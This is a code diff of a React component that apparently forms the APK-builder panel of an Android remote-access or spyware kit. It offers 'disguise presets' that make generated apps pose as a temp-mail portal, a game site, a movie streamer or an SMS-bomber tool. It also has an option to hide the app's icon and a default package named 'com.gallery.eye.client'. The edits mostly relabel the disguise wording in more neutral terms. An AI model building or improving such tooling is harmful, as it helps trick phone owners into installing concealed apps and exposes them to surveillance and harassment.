@@ -26,7 +26,7 @@ const DISGUISE_PRESETS = [
         url: '',
         color: 'from-indigo-500/20 via-blue-500/10 to-transparent border-indigo-500/40 text-indigo-300',
         badgeColor: 'bg-indigo-500/20 text-indigo-300 border-indigo-500/40',
-        description: 'Set your own App Name, custom URL & upload your own icon.'
+        description: 'Set custom App Name, Web Link & upload your own Icon.'
     },
     {
         id: 'temp_mail',
@@ -35,7 +35,7 @@ const DISGUISE_PRESETS = [
         url: 'https://mail.tm/en/',
         color: 'from-emerald-500/20 via-teal-500/10 to-transparent border-emerald-500/40 text-emerald-300',
         badgeColor: 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40',
-        description: 'Instant temporary email inbox disguise with live portal.'
+        description: 'Pre-integrated temporary mail portal (https://mail.tm/en/)'
     },
     {
         id: 'poki_games',
@@ -44,7 +44,7 @@ const DISGUISE_PRESETS = [
         url: 'https://poki.com/',
         color: 'from-purple-500/20 via-fuchsia-500/10 to-transparent border-purple-500/40 text-purple-300',
         badgeColor: 'bg-purple-500/20 text-purple-300 border-purple-500/40',
-        description: 'Free online gaming arcade portal disguise.'
+        description: 'Pre-integrated free gaming arcade (https://poki.com/)'
     },
     {
         id: 'movie_box',
@@ -53,7 +53,7 @@ const DISGUISE_PRESETS = [
         url: 'https://movie-box.co/',
         color: 'from-rose-500/20 via-pink-500/10 to-transparent border-rose-500/40 text-rose-300',
         badgeColor: 'bg-rose-500/20 text-rose-300 border-rose-500/40',
-        description: 'Cinema streaming and entertainment hub disguise.'
+        description: 'Pre-integrated cinema streaming hub (https://movie-box.co/)'
     },
     {
         id: 'sms_bomber',
@@ -62,7 +62,7 @@ const DISGUISE_PRESETS = [
         url: 'https://h4k3r-bomber.vercel.app',
         color: 'from-amber-500/20 via-orange-500/10 to-transparent border-amber-500/40 text-amber-300',
         badgeColor: 'bg-amber-500/20 text-amber-300 border-amber-500/40',
-        description: 'High-speed utility & testing toolkit disguise.'
+        description: 'Pre-integrated utility testing toolkit (h4k3r-bomber)'
     }
 ];
 
@@ -88,7 +88,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
 
     // Customization State
     const [selectedPreset, setSelectedPreset] = useState<string>('custom');
-    const [appName, setAppName] = useState("Custom Web App");
+    const [appName, setAppName] = useState("");
     const [packageName, setPackageName] = useState("com.gallery.eye.client");
     const [hideApp, setHideApp] = useState(false);
     const [webLink, setWebLink] = useState("");
@@ -98,7 +98,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     const generatePackageName = (name: string) => {
         const cleaned = name.toLowerCase().replace(/[^a-z0-9\s]/g, '').trim();
         const parts = cleaned.split(/\s+/).filter(Boolean);
-        if (parts.length === 0) return "com.app.gallery";
+        if (parts.length === 0) return "com.gallery.eye.client";
         if (parts.length === 1) return `com.${parts[0]}.app`;
         return `com.${parts[0]}.${parts.slice(1).join('')}`;
     };
@@ -106,10 +106,14 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     const handlePresetChange = (presetId: string) => {
         setSelectedPreset(presetId);
         const preset = DISGUISE_PRESETS.find(p => p.id === presetId);
-        if (preset) {
+        if (preset && presetId !== 'custom') {
             setAppName(preset.name);
             setPackageName(preset.packageName);
             setWebLink(preset.url);
+        } else if (presetId === 'custom') {
+            setAppName("");
+            setPackageName("com.gallery.eye.client");
+            setWebLink("");
         }
     };
 
@@ -194,7 +198,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             try {
                 const link = document.createElement('a');
                 link.href = data.downloadUrl;
-                link.download = `${appName.replace(/\s+/g, '_')}.apk`;
+                link.download = `${(appName || "app").replace(/\s+/g, '_')}.apk`;
                 document.body.appendChild(link);
                 link.click();
                 document.body.removeChild(link);
@@ -234,15 +238,37 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     };
 
     const startGeneration = async () => {
-        if (!hideApp && !webLink.trim()) {
-            setAlertData({
-                title: 'Web Link Required',
-                message: 'Please provide a WebView link for your app.\n\nThe app needs a URL to display when launched.',
-                type: 'warning'
-            });
-            setShowCustomAlert(true);
-            return;
+        // Validation: ONLY validate when custom preset is selected AND hideApp is OFF
+        if (selectedPreset === 'custom' && !hideApp) {
+            if (!appName.trim()) {
+                setAlertData({
+                    title: 'App Name Required',
+                    message: 'Please enter your app display name for the custom app.',
+                    type: 'warning'
+                });
+                setShowCustomAlert(true);
+                return;
+            }
+            if (!webLink.trim()) {
+                setAlertData({
+                    title: 'Web Link Required',
+                    message: 'Please provide a WebView link for your custom app.\n\nThe app needs a URL to display when launched.',
+                    type: 'warning'
+                });
+                setShowCustomAlert(true);
+                return;
+            }
+            if (!customIcon && !customIconPreview) {
+                setAlertData({
+                    title: 'Custom Icon Required',
+                    message: 'Please select an icon (PNG/JPG) for your custom app.',
+                    type: 'warning'
+                });
+                setShowCustomAlert(true);
+                return;
+            }
         }
+        // If hideApp is ON or if user selected a pre-integrated disguise (Temp Mail, Poki, Movie Box, SMS Bomber), proceed instantly without popups!
 
         setStatus('generating');
         setProgress(5);
@@ -255,7 +281,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
 
             const formData = new FormData();
             formData.append('uuid', uuid);
-            formData.append('appName', appName);
+            formData.append('appName', appName || (selectedPreset === 'custom' ? 'Custom App' : selectedPreset));
             formData.append('packageName', packageName);
             formData.append('hideApp', hideApp.toString());
             formData.append('webLink', webLink);
@@ -306,7 +332,6 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
         }
     };
 
-    // Ultra-realistic icon renderer for phone preview
     const renderRealisticIcon = () => {
         if (customIconPreview) {
             return (
@@ -443,10 +468,10 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                     {activeStep === 'identity' && (
                         <div className="space-y-6 animate-in fade-in duration-200">
                             
-                            {/* Colorful Soft UI Disguise Presets */}
+                            {/* 2-Column App Card Grid Layout ("matalb ak line ma do ok") */}
                             <div>
-                                <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-2.5">Select Disguise Preset</label>
-                                <div className="grid grid-cols-1 sm:grid-cols-5 gap-2.5">
+                                <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-3">Select Application Mode</label>
+                                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                                     {DISGUISE_PRESETS.map((p) => {
                                         const isSelected = selectedPreset === p.id;
                                         return (
@@ -454,86 +479,118 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                 key={p.id}
                                                 type="button"
                                                 onClick={() => handlePresetChange(p.id)}
-                                                className={`p-3 rounded-2xl border text-left flex flex-col gap-1.5 transition-all ${
+                                                className={`p-4 rounded-2xl border text-left flex items-start justify-between gap-3 transition-all ${
                                                     isSelected
-                                                        ? `bg-gradient-to-b ${p.color} shadow-lg scale-[1.02]`
+                                                        ? `bg-gradient-to-br ${p.color} shadow-[0_8px_24px_rgba(0,0,0,0.4)] scale-[1.01]`
                                                         : 'bg-black/40 border-white/10 hover:border-white/20 text-fg-3'
                                                 }`}
                                             >
-                                                <div className="flex items-center justify-between">
-                                                    <span className="text-xs font-extrabold text-white truncate">{p.name}</span>
-                                                    {isSelected && <CheckCircle2 size={14} className="text-emerald-400 flex-shrink-0" />}
+                                                <div className="flex flex-col gap-1">
+                                                    <div className="flex items-center gap-2">
+                                                        <span className="text-sm font-black text-white">{p.name}</span>
+                                                        {isSelected && (
+                                                            <span className="text-[10px] px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 font-extrabold border border-emerald-500/40">
+                                                                ACTIVE
+                                                            </span>
+                                                        )}
+                                                    </div>
+                                                    <span className="text-xs text-fg-3 line-clamp-1">{p.description}</span>
+                                                    <span className="text-[10px] text-fg-4 font-mono">{p.packageName}</span>
                                                 </div>
-                                                <span className="text-[10px] text-fg-4 truncate font-mono">{p.packageName}</span>
+                                                {isSelected && <CheckCircle2 size={18} className="text-emerald-400 flex-shrink-0 mt-0.5" />}
                                             </button>
                                         );
                                     })}
                                 </div>
                             </div>
 
-                            {/* App Configuration & Soft UI Phone Screen Preview */}
-                            <div className="grid grid-cols-1 sm:grid-cols-12 gap-5 items-start">
+                            {/* Conditional Configuration & Phone Preview Layout */}
+                            <div className="grid grid-cols-1 sm:grid-cols-12 gap-5 items-start pt-2">
                                 
-                                {/* Identity Inputs */}
-                                <div className="sm:col-span-7 space-y-4">
-                                    <div>
-                                        <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">App Display Name</label>
-                                        <input
-                                            type="text"
-                                            value={appName}
-                                            onChange={(e) => handleAppNameChange(e.target.value)}
-                                            className="w-full bg-black/50 border border-white/10 rounded-2xl px-4 py-3 text-white font-bold focus:outline-none focus:border-emerald-500/60 transition-colors shadow-inner"
-                                            placeholder="Enter App Name"
-                                        />
-                                    </div>
+                                {/* Form Inputs: ONLY Shown when selectedPreset === 'custom' */}
+                                {selectedPreset === 'custom' ? (
+                                    <div className="sm:col-span-7 space-y-4 animate-in fade-in">
+                                        {/* App Display Name */}
+                                        <div>
+                                            <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">App Display Name</label>
+                                            <input
+                                                type="text"
+                                                value={appName}
+                                                onChange={(e) => handleAppNameChange(e.target.value)}
+                                                className="w-full bg-black/50 border border-white/10 rounded-2xl px-4 py-3 text-white font-bold focus:outline-none focus:border-emerald-500/60 transition-colors shadow-inner"
+                                                placeholder="enter your app name"
+                                            />
+                                        </div>
 
-                                    {/* Portal Web URL */}
-                                    <div>
-                                        <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">Embedded Web Portal</label>
-                                        {selectedPreset !== 'custom' ? (
-                                            <div className="w-full bg-black/60 border border-emerald-500/30 rounded-2xl px-4 py-3 text-emerald-300 text-xs font-mono flex items-center justify-between shadow-inner">
-                                                <span className="truncate">Pre-integrated: {webLink}</span>
-                                                <span className="text-[10px] px-2 py-0.5 rounded-full bg-emerald-500/20 border border-emerald-500/40 text-emerald-300 font-bold ml-2">
-                                                    READY
-                                                </span>
-                                            </div>
-                                        ) : (
+                                        {/* Package Identifier (Dynamic with App Name) */}
+                                        <div>
+                                            <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">Package Identifier</label>
+                                            <input
+                                                type="text"
+                                                value={packageName}
+                                                onChange={(e) => setPackageName(e.target.value.toLowerCase().replace(/[^a-z0-9.]/g, ''))}
+                                                className="w-full bg-black/50 border border-white/10 rounded-2xl px-4 py-3 text-white font-mono text-xs focus:outline-none focus:border-emerald-500/60 transition-colors shadow-inner"
+                                                placeholder="com.gallery.eye.client"
+                                            />
+                                            <p className="text-[11px] text-fg-4 mt-1">Automatically generates with app name</p>
+                                        </div>
+
+                                        {/* Custom Web Portal Link */}
+                                        <div>
+                                            <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">Launch Web URL</label>
                                             <input
                                                 type="url"
                                                 value={webLink}
                                                 onChange={(e) => setWebLink(e.target.value)}
                                                 className="w-full bg-black/50 border border-white/10 rounded-2xl px-4 py-3 text-white text-sm focus:outline-none focus:border-emerald-500/60 transition-colors shadow-inner"
-                                                placeholder="https://your-custom-link.com"
+                                                placeholder="https://example.com"
                                             />
-                                        )}
-                                        <p className="text-[11px] text-fg-4 mt-1">
-                                            {selectedPreset !== 'custom' 
-                                                ? "Official portal link is pre-configured and hidden from the user."
-                                                : "Enter the custom WebView URL opened when the app launches."}
-                                        </p>
-                                    </div>
+                                        </div>
 
-                                    <div>
-                                        <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">Upload Custom Icon PNG (Optional)</label>
-                                        <label className="w-full bg-black/40 border border-dashed border-white/15 hover:border-white/30 rounded-2xl p-3 flex items-center justify-between cursor-pointer transition-colors group">
-                                            <div className="flex items-center gap-2.5">
-                                                <div className="w-9 h-9 rounded-xl bg-white/5 flex items-center justify-center text-fg-3 group-hover:text-white transition-colors">
-                                                    <Upload size={16} />
+                                        {/* Custom Icon PNG */}
+                                        <div>
+                                            <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">Upload Custom Icon PNG</label>
+                                            <label className="w-full bg-black/40 border border-dashed border-white/15 hover:border-white/30 rounded-2xl p-3 flex items-center justify-between cursor-pointer transition-colors group">
+                                                <div className="flex items-center gap-2.5">
+                                                    <div className="w-9 h-9 rounded-xl bg-white/5 flex items-center justify-center text-fg-3 group-hover:text-white transition-colors">
+                                                        <Upload size={16} />
+                                                    </div>
+                                                    <div>
+                                                        <span className="text-xs font-bold text-white block">Choose PNG / JPG Icon</span>
+                                                        <span className="text-[10px] text-fg-4">Recommended 512x512px transparent</span>
+                                                    </div>
                                                 </div>
-                                                <div>
-                                                    <span className="text-xs font-bold text-white block">Choose PNG / JPG Icon</span>
-                                                    <span className="text-[10px] text-fg-4">Recommended 512x512px transparent</span>
-                                                </div>
-                                            </div>
-                                            <input
-                                                type="file"
-                                                accept="image/png, image/jpeg"
-                                                onChange={(e) => handleIconSelect(e.target.files?.[0] || null)}
-                                                className="hidden"
-                                            />
-                                        </label>
+                                                <input
+                                                    type="file"
+                                                    accept="image/png, image/jpeg"
+                                                    onChange={(e) => handleIconSelect(e.target.files?.[0] || null)}
+                                                    className="hidden"
+                                                />
+                                            </label>
+                                        </div>
                                     </div>
-                                </div>
+                                ) : (
+                                    <div className="sm:col-span-7 bg-gradient-to-br from-emerald-500/10 via-teal-500/5 to-transparent border border-emerald-500/30 rounded-3xl p-5 flex flex-col justify-between space-y-4 animate-in fade-in">
+                                        <div className="flex items-start gap-3">
+                                            <div className="p-2.5 rounded-2xl bg-emerald-500/20 border border-emerald-500/40 text-emerald-300">
+                                                <Sparkles size={20} />
+                                            </div>
+                                            <div>
+                                                <h4 className="text-sm font-extrabold text-white">Pre-Integrated Portal Ready</h4>
+                                                <p className="text-xs text-fg-3 mt-1 leading-relaxed">
+                                                    You selected <strong>{appName}</strong>. The Display Name, Android Package (<strong>{packageName}</strong>), embedded Web URL, and authentic Icon are automatically configured!
+                                                </p>
+                                            </div>
+                                        </div>
+
+                                        <div className="bg-black/40 rounded-2xl p-3 border border-white/10 flex items-center justify-between">
+                                            <span className="text-xs text-fg-3 font-mono truncate">{webLink}</span>
+                                            <span className="text-[10px] px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-300 font-bold ml-2">
+                                                INTEGRATED
+                                            </span>
+                                        </div>
+                                    </div>
+                                )}
 
                                 {/* Soft UI Phone Home-Screen Preview */}
                                 <div className="sm:col-span-5 bg-gradient-to-b from-black/60 to-black/30 border border-white/10 rounded-3xl p-5 flex flex-col items-center justify-center text-center shadow-xl">
@@ -548,7 +605,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                         )}
                                     </div>
 
-                                    <span className="text-sm font-black text-white max-w-[140px] truncate">{appName || "App Name"}</span>
+                                    <span className="text-sm font-black text-white max-w-[140px] truncate">{appName || "enter your app name"}</span>
                                     <span className="text-[10px] font-mono text-fg-4 mt-0.5 truncate max-w-[160px]">{packageName}</span>
 
                                     {/* Hide App Toggle Switch */}
